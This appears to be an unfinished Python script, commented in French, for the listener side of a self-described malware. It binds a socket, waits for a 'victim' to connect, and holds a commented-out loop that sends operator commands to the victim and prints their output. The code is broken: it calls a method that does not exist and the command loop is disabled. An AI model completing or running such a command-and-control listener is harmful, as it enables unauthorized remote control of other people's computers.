# coding=utf-8
import socket, sys, os, time, threading


VICTIME_IP = "" # ? Peut-on la modifier en ligne 19?


#classe concernant le malware
class mon_malware():
    '''





    '''

    ENCODING = 'UTF-8'
    CLIENT_IP = "127.0.0.1"

    def __init__(self, port : int):
        self.port = port
        self.s = socket.socket()
        self.s.bind((self.CLIENT_IP, port))

    def listen(self):
        self.s.listen(1)
        print("En Attente du client...")
        try:
            conn, addr = self.s.accept()
            VICTIME_IP = addr[0]# Récupération de l'IP de la victime
            print("Client : %s" %VICTIME_IP)
        except socket.timeout:
            self.disconnect()
            print("[!] Aucune réponse du client.")
        except:
            self.disconnect()
            print("[!] Erreur lors de la connexion.")

    def disconnect(self ):
        self.s.close()
        print("Fermeture de la connexion.")


# Toutes les commandes
'''
class Commands():
    while True:
        command = input("#>")
        if command != "exit()":
            if command == "":
                continue

            conn.send(command.encode(ENCODING))
            result = conn.recv(1024).decode(ENCODING)
            total_size = len(result[:16])
            result = result[16:]

            while total_size > len(result):
                data = conn.recv(1024)
                result += data
            print(result)
            print("\n")

        else:
            conn.send("exit()")
            print("Connexion fermée")
    break

'''
# Menu d'affichage
class Menu():
    pass


concombre = mon_malware(50000)
concombre.connect()
concombre.disconnect()